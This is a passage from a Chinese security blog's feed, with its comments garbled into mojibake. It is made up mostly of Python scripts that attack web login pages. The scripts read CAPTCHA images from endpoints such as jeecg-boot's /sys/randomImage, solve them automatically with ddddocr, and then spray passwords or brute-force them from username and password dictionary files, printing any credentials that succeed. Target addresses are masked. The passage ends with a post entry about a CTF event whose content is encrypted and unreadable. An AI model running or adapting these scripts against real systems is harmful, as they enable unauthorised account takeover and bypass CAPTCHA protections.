é”™è¯¯: test:<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="comment"># å¦‚æœå“åº”å†…å®¹åŒ…å« &quot;ç™»å½•æˆåŠŸ&quot;ï¼Œåˆ™ç™»å½•æˆåŠŸ</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="string">&quot;ç™»å½•æˆåŠŸ&quot;</span> <span class="keyword">in</span> content <span class="keyword">or</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> content.lower():</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] ç™»å½•æˆåŠŸï¼è´¦å·å¯†ç : test:<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span>  <span class="comment"># æ‰¾åˆ°æ­£ç¡®å¯†ç ï¼Œé€€å‡ºå¾ªç¯</span></span><br><span class="line">                <span class="comment"># å…¶ä»–å“åº”å†…å®¹ï¼Œè¾“å‡ºè¯¦ç»†ä¿¡æ¯</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n[!] æœªçŸ¥å“åº”å†…å®¹: <span class="subst">&#123;content&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] è´¦å·å¯†ç : test:<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                response.close()</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å¯†ç å­—å…¸æ–‡ä»¶ &#x27;passwd.txt&#x27; æœªæ‰¾åˆ°ã€‚è¯·ç¡®ä¿æ–‡ä»¶å­˜åœ¨äºè„šæœ¬æ‰€åœ¨ç›®å½•ã€‚&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å‘ç”Ÿå¼‚å¸¸: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="part-3"><a href="#part-3" class="headerlink" title="part 3"></a>part 3</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> ddddocr</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_code</span>(<span class="params">orc , baseurl , longTime , shortTime</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è¯†åˆ«å‡ºç™»å½•æ¥å£ä¸­å›¾åƒéªŒè¯ç ä¸Šçš„å­—ç¬¦&quot;&quot;&quot;</span></span><br><span class="line">    url = baseurl + <span class="string">&#x27;/sys/randomImage/&#x27;</span> + <span class="built_in">str</span>(longTime) + <span class="string">&#x27;?_t=&#x27;</span> + <span class="built_in">str</span>(shortTime)</span><br><span class="line">    res = requests.request(<span class="string">&quot;get&quot;</span>, url).json()</span><br><span class="line">    <span class="comment"># key = res_data[&#x27;key&#x27;]    # è§£æå“åº”ä¸­çš„key</span></span><br><span class="line">    base64_data = res[<span class="string">&#x27;result&#x27;</span>]  <span class="comment"># è§£æéªŒè¯ç çš„base64ç¼–ç æ•°æ®</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¯¹çš„base64ç¼–ç è½¬æ¢æˆå›¾ç‰‡</span></span><br><span class="line">    data = base64_data.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>]  <span class="comment"># å»æ‰ç¼–ç æ•°æ®ä¸­çš„data:image\/png;base64</span></span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    img_data = base64.b64decode(data)  <span class="comment"># è§£ç </span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./img.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> png:  <span class="comment"># æ‰“å¼€å›¾ç‰‡</span></span><br><span class="line">        png.write(img_data)  <span class="comment"># ä¿å­˜å›¾ç‰‡</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ©ç”¨ddddocrè¯†åˆ«éªŒè¯ç å›¾ç‰‡ä¸Šçš„å­—ç¬¦</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./img.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        img_bytes = f.read()  <span class="comment"># è¯»å–å›¾ç‰‡</span></span><br><span class="line">    code = ocr.classification(img_data)  <span class="comment"># è¯†åˆ«å›¾ç‰‡ä¸Šçš„å­—ç¬¦</span></span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">orc , loginUrl , username , password</span>):</span><br><span class="line">    t = time.time()</span><br><span class="line">    shortTime = <span class="built_in">int</span>(t)</span><br><span class="line">    longTime = <span class="built_in">int</span>(<span class="built_in">round</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line">    captcha = get_code(orc , <span class="string">&quot;http://&lt;IP&gt;:9000&quot;</span> , longTime , shortTime)</span><br><span class="line">    param = <span class="string">&quot;&#123;&#123;\&quot;username\&quot;:\&quot;&#123;&#125;\&quot;,\&quot;password\&quot;:\&quot;&#123;&#125;\&quot;,\&quot;captcha\&quot;:\&quot;&#123;&#125;\&quot;,\&quot;checkKey\&quot;:&#123;&#125;,\&quot;remember_me\&quot;:true&#125;&#125;&quot;</span>.<span class="built_in">format</span>(username, password, captcha, <span class="built_in">str</span>(longTime))</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/javascript, */*; q=0.01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;identity&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json;charset=UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url=loginUrl, data=param, headers=headers, verify=<span class="literal">False</span>, proxies=proxies,</span><br><span class="line">                             allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">loginUrl = <span class="string">&quot;http://&lt;IP&gt;:9000/sys/login&quot;</span></span><br><span class="line">ocr = ddddocr.DdddOcr()</span><br><span class="line"><span class="comment"># resp = login(ocr, loginUrl, &quot;admin&quot;, &quot;*****12345&quot;)</span></span><br><span class="line"><span class="comment"># print(len(resp.content.decode(&#x27;utf-8&#x27;)))</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;ç‡ƒæ–™ç®¡ç†ç³»ç»Ÿç”¨æˆ·å.txt&quot;</span>)               <span class="comment"># è¿”å›ä¸€ä¸ªæ–‡ä»¶å¯¹è±¡</span></span><br><span class="line">line = f.readline()               <span class="comment"># è°ƒç”¨æ–‡ä»¶çš„ readline()æ–¹æ³•</span></span><br><span class="line"><span class="keyword">for</span> num,value <span class="keyword">in</span> <span class="built_in">enumerate</span>(f):</span><br><span class="line">    sys.stdout.write(<span class="string">f&quot;\ræ­£åœ¨æ‰§è¡Œç¬¬<span class="subst">&#123;num&#125;</span>æ¡&quot;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    value = value.replace(<span class="string">&quot;\n&quot;</span> , <span class="string">&quot;&quot;</span>)</span><br><span class="line">    response = login(ocr , loginUrl , value , <span class="string">&quot;2007be359*********2c0d142d3a7f7&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span>(<span class="string">&quot;éªŒè¯ç é”™è¯¯&quot;</span> <span class="keyword">in</span> response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        response = login(ocr, loginUrl, value, <span class="string">&quot;2007be359*********2c0d142d3a7f7&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))!=<span class="number">91</span> <span class="keyword">and</span> <span class="built_in">len</span>(response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)) != <span class="number">89</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]å“åº”å†…å®¹&quot;</span>+response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]è´¦å·å¯†ç ï¼š&quot;</span>+value + <span class="string">&quot;:&quot;</span> + <span class="string">&quot;*****12345&quot;</span>)</span><br><span class="line">    response.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="part-4"><a href="#part-4" class="headerlink" title="part 4"></a>part 4</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ddddocr</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests,base64,json,sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getcode</span>(<span class="params">ocr</span>):</span><br><span class="line"></span><br><span class="line">    t = time.time()</span><br><span class="line">    shortTime = <span class="built_in">int</span>(t)</span><br><span class="line">    longTime = <span class="built_in">int</span>(<span class="built_in">round</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># imgurl = &#x27;http://&lt;IP&gt;:3000/jeecg-boot/sys/randomImage/1720053789642&#x27;</span></span><br><span class="line"></span><br><span class="line">    url = <span class="string">&#x27;http://&lt;IP&gt;:3000/jeecg-boot/sys/randomImage/&#x27;</span> + <span class="built_in">str</span>(longTime) + <span class="string">&#x27;?_t=&#x27;</span> + <span class="built_in">str</span>(shortTime)</span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    res = requests.request(<span class="string">&quot;get&quot;</span>, url).json()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(res)</span></span><br><span class="line">    base64_data = res[<span class="string">&#x27;result&#x27;</span>]  </span><br><span class="line">    timestamp = <span class="built_in">str</span>(longTime)  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(base64_data)</span></span><br><span class="line">    <span class="comment"># print(timestamp)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¯¹çš„base64ç¼–ç è½¬æ¢æˆå›¾ç‰‡</span></span><br><span class="line">    data = base64_data.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>]  <span class="comment"># å»æ‰ç¼–ç æ•°æ®ä¸­çš„data:image\/png;base64</span></span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    img_data = base64.b64decode(data)  <span class="comment"># è§£ç </span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./img.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> png:  <span class="comment"># æ‰“å¼€å›¾ç‰‡</span></span><br><span class="line">        png.write(img_data)  <span class="comment"># ä¿å­˜å›¾ç‰‡</span></span><br><span class="line">    <span class="comment"># ocr = ddddocr.DdddOcr()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ©ç”¨ddddocrè¯†åˆ«éªŒè¯ç å›¾ç‰‡ä¸Šçš„å­—ç¬¦</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./img.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        img_bytes = f.read()  <span class="comment"># è¯»å–å›¾ç‰‡</span></span><br><span class="line">    captcha = ocr.classification(img_data)  <span class="comment"># è¯†åˆ«å›¾ç‰‡ä¸Šçš„å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(&#x27;[+] è¯†åˆ«åˆ°éªŒè¯ç ä¸º:&#x27;, captcha)</span></span><br><span class="line">    <span class="keyword">return</span> captcha,timestamp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">ocr , loginUrl , username , password</span>):</span><br><span class="line"></span><br><span class="line">    captcha,timestamp = getcode(ocr)</span><br><span class="line">    <span class="comment"># print(captcha)</span></span><br><span class="line">    <span class="comment"># print(timestamp)</span></span><br><span class="line"></span><br><span class="line">    param = <span class="string">&quot;&#123;&#123;\&quot;username\&quot;:\&quot;&#123;&#125;\&quot;,\&quot;password\&quot;:\&quot;&#123;&#125;\&quot;,\&quot;captcha\&quot;:\&quot;&#123;&#125;\&quot;,\&quot;checkKey\&quot;:&#123;&#125;&#125;&#125;&quot;</span>.<span class="built_in">format</span>(username, password, captcha, <span class="built_in">str</span>(timestamp))</span><br><span class="line">    <span class="comment"># print(param)</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/javascript, */*; q=0.01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;identity&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json;charset=UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url=loginUrl, data=param, headers=headers, verify=<span class="literal">False</span>,</span><br><span class="line">                             allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># loginurl = &#x27;http://&lt;IP&gt;:3000/jeecg-boot/sys/login&#x27;</span></span><br><span class="line">    <span class="comment"># data = &#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;captcha&quot;:&quot;4c64&quot;,&quot;checkKey&quot;:1720053412912&#125;</span></span><br><span class="line">    <span class="comment"># req = requests.post(url=loginurl,data=data)</span></span><br><span class="line">    <span class="comment"># if &quot;æ“ä½œå¤±è´¥&quot; in req.content.decode(&#x27;utf-8&#x27;) or &quot;éªŒè¯ç é”™è¯¯&quot; in  req.content.decode(&#x27;utf-8&#x27;):</span></span><br><span class="line">    <span class="comment">#     print(req.content.decode(&#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="comment">#     print(len(req.content.decode(&#x27;utf-8&#x27;)))</span></span><br><span class="line">    <span class="comment">#     # 162</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ocr = ddddocr.DdddOcr()</span><br><span class="line">    <span class="comment"># captcha,timestamp = getcode()</span></span><br><span class="line">    <span class="comment"># print(captcha,timestamp)</span></span><br><span class="line">    loginurl = <span class="string">&#x27;http://&lt;IP&gt;:3000/jeecg-boot/sys/login&#x27;</span></span><br><span class="line">    <span class="comment"># data = &#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;captcha&quot;:&quot;4c64&quot;,&quot;checkKey&quot;:1720053412912&#125;</span></span><br><span class="line">    <span class="comment"># param = &quot;&#123;&#123;\&quot;username\&quot;:\&quot;&#123;&#125;\&quot;,\&quot;password\&quot;:\&quot;&#123;&#125;\&quot;,\&quot;captcha\&quot;:\&quot;&#123;&#125;\&quot;,\&quot;checkKey\&quot;:&#123;&#125;&#125;&#125;&quot;.format(username, &quot;*****12345&quot;, captcha, str(timestamp))</span></span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;users.txt&quot;</span>)</span><br><span class="line">    line = f.readline()</span><br><span class="line">    <span class="keyword">for</span> num,uname <span class="keyword">in</span> <span class="built_in">enumerate</span>(f):</span><br><span class="line">        sys.stdout.write(<span class="string">f&quot;\ræ­£åœ¨æ‰§è¡Œç¬¬<span class="subst">&#123;num&#125;</span>æ¡&quot;</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        uname = uname.replace(<span class="string">&quot;\n&quot;</span> , <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="comment"># print(uname)</span></span><br><span class="line">        response = login(ocr , loginurl , uname , <span class="string">&quot;*****12345&quot;</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="string">&quot;éªŒè¯ç é”™è¯¯&quot;</span> <span class="keyword">in</span> response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            response = login(ocr, loginurl, uname, <span class="string">&quot;*****12345&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># if(len(response.content.decode(&#x27;utf-8&#x27;))!=162 ) and &quot;è¯¥ç”¨æˆ·ä¸å­˜åœ¨ï¼Œè¯·æ³¨å†Œ&quot; not in response.content.decode(&#x27;utf-8&#x27;) :</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ç™»å½•æˆåŠŸ&quot;</span> <span class="keyword">in</span> response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">            <span class="comment"># print(&quot;[+]å“åº”å†…å®¹&quot;+response.content.decode(&#x27;utf-8&#x27;) + &quot;\n&quot;)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]è´¦å·å¯†ç ï¼š&quot;</span>+uname + <span class="string">&quot;:&quot;</span> + <span class="string">&quot;*****12345&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        response.close()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>YLCTFåŠèµ›æ‚è°ˆ</title>
    <url>/posts/1157f24e/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="52c8fcfbdfa63269b5111896fac53b6657c6f9ba66affba8f030a891e221a0f7">8e4abdbbac26264e95e5447f805413d3f3de967513da63871968c41ee2cc57f498c1a191b6b75f5aa200853d594f676591d7143f7a393f5f6a09dac98db469dfd756ad975da3fda5f53075f76286ae33d849d6cfdf506614b1355d3d69a022a4407f46b64257ed866a0d9a20f1ad8e9d4631abd38ee2882bdb6031898f8e6d5c6df9edf9f098dc6217e1b7fe3618d7a02c20cd490ce7ff9cd19d9e3c2109ef7835020081beb522700fc162f4b4f9c4011aaa5673d6b0f2bd71bfb7a839f654869e597d048f143fc31028e56356e1ddd8adebe7e9ba852b44d36019b59f3ef5d58980c737db33bf5cc38a618713723c9d6625357186a82d7f062067617e80b2cda1eafb29a823484d3c547455af796e7015f293cb6e8d469f5856da2ff2bda04329afaf3553c53bca2466511dfea5c65113cb54813d160e4fcb749935994f20d5972a7b0357813ae98c624f457f4f1901818116b86c3d23803621030e55bc2e28ab277781255b6920ee2e116c5ae563ebb8bf1bf5895ddee289e83221b81ea853c618f253e20ccad3fa70efc6737c47b7a25a90d66120508d3d502c939a4d24fed398f67a166f1a0d956c53ba483a884ddce2c19586e3ff6d111dba2808dec3cdb0f7c90eaeca6d95880d8709159978eeb614a7cbdc8879c6ecfbc8acdf288efef0aec3bd07e3d7448a175e01332b1006a2a94cbee72c5123176a6d4731bf3fc9556a9c2deb2704cd0390330a6cc596c4c469ad5a57cdfd6f8be964ec5b5d2c063307b60d7739b242f4b3b4b32f22a5967bc3559edd5b98979ed0e14f01382fbec63e99ab0ffa0dae3397126ccc1f23f9ba7aa0c8a4d955840ddc98ff02b6d748345ce9e89420f874f494635bc0ba6759c3a2454cd10cf3b635faad4cc1f183fa58faad544f40d11bf9ac8dc06e0d6ac4ba139c4a9ee1d0b45cff84088aec3c1e6c692e54844bd46f2d51e42636986673e9c72acb7a58d68cf4d82e2bfd69ed42ff3363e197b046a452fd168d96b7b8f82a288ec2b44f803afcfc628df0ec19ed9624989964554ac458a777d1f3c55df7f2c07fb2b06ddc1f9476468a353e8ce48e5e8c4c85d58712347f6844c0a09d869faa2a34c1b230b99d7d71b139ce3488efd3a0b68a09d09e8d5603df3d894aec59b7c59f8d932281b6530c87aa408332ddbc6d21ae2383b6f9084fff99e5d628ba7cfc7f7b19192075f5e5f7fa73e2af6f2fadb46a1496c7ae4e574c1b01fe5ca93b148f96229461734ca9c166d0b0d37ca27a387bba9a9ebfb84a5ea5e1d31bf13fc5eae4c9ccae13c353a333597e1377e64520f3f255ad5b535a0d8d54eb8f2f69bd2c500bf8dae75ddc43b90d39b68e741db0742f98b62cc39dfce036be222ec111b046f0ded1eeea8cac1cac00b878834328d61f25efa38b2a011179be3877493256dd39c0fee27bfd92a236068ceb8fb951656c68d02c1d0f10abd5b5070a1a355728d68d7088d9a3b3923580ca0dd82a87877d5ed8e8f95e6261368c09a475f28596d285ca910531e74ff35339a4b29061a40e8b3c370f375ae4c20effd9337da7cb74a54f43b0cd4568b4093809c55dbf9df6efb35b7eadbe72909573cb1d1db8a75313386437281da7076223cf36b993b3873ac6ca6ff9f78bc1d4a0ff8616752ec04e5417fa320f2b981b9d87d941fa63d75545e1e3f06e690ce540d8b815582a98b6b62de4dff3f2f22f3cf1ef1cd3d6c65d102eb607bad64ca00bf0fd1f5a42a33de65fd9c9d08c0b0fff27e00d85852278f2afd404977ce15571b02244025dad75213952849ed397dd15f1def57ace5ef1fbf88073ceb729e22ebfb88312f46af2221858b878235014be8f727426e242b11851630c3a9dc693efc4e9890f557f1f20e3b03b3009fd0d8129febbbe878821825c984972dae855c358ed2c01bfc67be66d9e17cbdb9a105d36b81d47fe65e4e686dd417efa985fd1fdc5d7bd2f58a09716729e14273627ec813b1d35a941d7c41e734e12e320e4db74033796c92f74ced5a2883dd9b4f3ca9850eab42c80be705b182672675e06c088d316af9548dec95158119acfc6df131d40e560e079f1827da93e3c4226ee6261f242ac0c5e6f99ee945517bc19879ac78e3fc32d8291cfbf0fe330f4cc27ee74e9f435a5615c00da97ff2ec411e5a7a893d0031848f4664a523d8666bf0ea0b54de061fc7e4c04590ddcfe6d025c99c0813fd6fd7b855aa99a04595c8a95624ae7a6ef43cecfceac7e0166d0047a3fd88ac4080e061d65b7e7b63addfcbd01d9fc811a32c364b080f0db123b539927a123214068c7a2e0c447241ec118cf08c4232d59cfb148d03418a6f15fd75dc538d5cd2a316cf726ddb4c7235883902d409bf9dbc97681c137c7bdc249166c082c4e83835c25e3171b1daaecb2c3e048db4139bc2047aaa28049567874912f41c57e3b2a6292fb75b8e1a8a683245ff77fcf7bff63a42eb5b6afe3d2bf040c4476fe6f75037a133bcfc4c8befc0ef637a6d5348af76399c8f2cd3aab386c3de5ad77c3cdbba90390837158241a76157d9c5e15994b087b4a5018cedcf84282556df0977d97004465f8e2269293d81cd402ebb9e880d8d83b4362d2fe8f75a8f29f098192502835d3827a0df2b52302d7a836f1e255237dea41a45f8094c06a5d3ac61d4daaa57c37382d81a38db5097dba1187e2ede9aed4dfcd9f8eed35f57f6d6b0b485b20f3ead97f847a0e6cf255c6aa16857a84d386d661c3d2f962a8b4db5f42f575a4c3b8065fc5170b2cbe2d2bf90a5d2b6c3194d157c625fa02e8ba1e9ea0137b6f8bc2682de38de7bc902e288b358928291a861224f339d83b757bfaaf4dfe13345f3060216b395632c771ec5cc532e1bdb647e216c85fca6cfc56ad3d153bbafb17d8b3d4050260747d0591a02517e976e50b280032c22cdcd74c0d0c56459f0944ff202861f12f7317435a8d16b85166bb228c08a9846d2688fe4f8b3ac34b579c2c602e7e5aae7a7c2600b371cc311cb1672f4f2cc547ebae1db9832bb65e19c8a72b2b3e7170e746f562958a08179629d7318714df122ec39a7a2875aec605055bd5b90749c725d2b8264f5db5239320efd8b1fa616788a45d848fc0968b0301924aba91bca16b695c2261f63b06d015bff6ce10980d5c806543f0a26b915621300c7e3a9743cb948a613870b4b13c983ef026cd7286069d8cbda170d3b0d6e0b81819ae7ef78fbfbac72251d76c740ae496ef2a3dad85579c5378ddcd16239d95ae31d7a98c0049a79587dbebc12c7d299f2129574113f410784bbf2e3d71a93c15c9011aac20ae42cf62253268c27ee0ed673d52463d2bcbba66b65ccf381dec661591816702d099f41bb5e2fe8565bde90d5a82c68e11a0492b1a4a5667bbdfba4c61e5bf38a67b20231ed7eb44effe135dfc748cb5d45826b64ca5d393d50b7bf3a73c61901074a459f40539590d2a89e75c9245c5839759db2af5cdef93e9e65560d064995391e14b31bc19a8cbad588ebdccf283f739ddfbb5090e9b38177e11f94579de36d3dc56f2f28aba833670773d9f1a064d1c336233bd7c4bd4a4d49b4d0386fe29de3155c2bba56824f434453e0d60b39214a4a576a8e01ebf80d6a0e54e122cbcdf6d569b2e4110ef96a9899a7f90195059aba1a2524b08f06fad09d56af6505399945d0b50d40499fb819bc5d0f478cd7a7217dca6a304e8df03df0d950f8c85f489e2b89e7139bac6dbc56fb971c71f220f064f332117d6384893588789cf3042c175b5f27bd5d08bb2870f7326092bb883c414a47d04df68b79856b23792b7061eb65d984c90b962d89d458e3257fb9437a273ebc28459f9f90db28cdd58ae3e90d3a3ecf0134d4a317faf80c927602183552955d950b7468e3b6d8fea461de15369fbaef48fc2fbb673e5459d1b10c45e84a3baa785267a82765a8e10082a98d5021e17d33f5c1dbfb3cef37423f9f55b4a87d5aa3fe82562fb59f4ea6d7d9aef51c99507b6d28d7ec232f592232fef0689458edd4fa681018d46e8d195da6a79d9bdacc40aae03417550a4ff1570c392e65b2ee0dd1646d8bd7ef0cd356223b59c4a2535198dfbbd8d3088f031545601e8269961a33a31162d6a5a3acbb3b012712b966428a104faea51954e88a720fbb74b0005f4efd9be7410115de7c0c06058a03ce7d5a5215aa3f12ac588e6b2fdf6603fab60263a35f3c1a5f73faa0f8a4d2b8621f7ab5aacef6df5df72611496775aa32e7baeac01434f24a4b90c97275a1fd2b9d8fb30f2fd3db2199b3e87bce6aacc16b0229448079035719a3154c32a767817c7f9444c8eb3ec2cf3beed067865573ecbe0a111891b0e7d33af655a79606e02cd152063fad84351e0b9e6c5eecfde106f38b4d2998f0675d1722b9de9fff304e17b5c2059c64eca33238c073c9b256bfdbbc4c3a98d16bafdcc1a6e53efba03bbe59a918512fbb90a73306d92cb972abbced81e38e6b2c31c50689769824699000bf3ad967503f0fe18b1d151d4041bddbc1586047cae0ef5fae8c92ec6728afb3b89ad20d07ff437c5cdc51eb63f9b4031b8ad82b77a4a714ab5cd05eaaf8aa01c0728025717ce683ca3c89390245ccc8f4ec35f5d22631032b078c9278c0ed9713047a9e0087c665d61d02235933e1f281844cdcbdd5a48a1985a925965b3f12334f513241ef6747ba5ab9b76ee3d599b0ded645d4187a8dfec050b4389ae08951a4d9a256fd5d028932c331e47cd44a16799c68b938d4d40bc5bd81baa82cdea2064c9cf14a16771c092f03ad0669edc8f4dcbfac03b8cfcc8114e84405958015a51b2ef880b226d4060120149bc271ee5cfc64b20f79ca087ed1fbe89cbf2b974f09995f17b9afd794202f484858f3c512d6dc7c6528ba27d7da7199affe696ace4180ab5a20fdfff15b6104aaae75391fed9cc446d384dd6143913da980e3251c66243afe088fe4a2261b2ab27025e8e13d70d858018e9679b65397aeabb81d061e021098d8f1ad85dd60dc08e032203cd6c7929797a2c2a704800efe21effc126b3557a48a42d652269fec6936015f224a4f83cc4dd7834fa85c54a1a6a0df7acc17dac00d772555917ba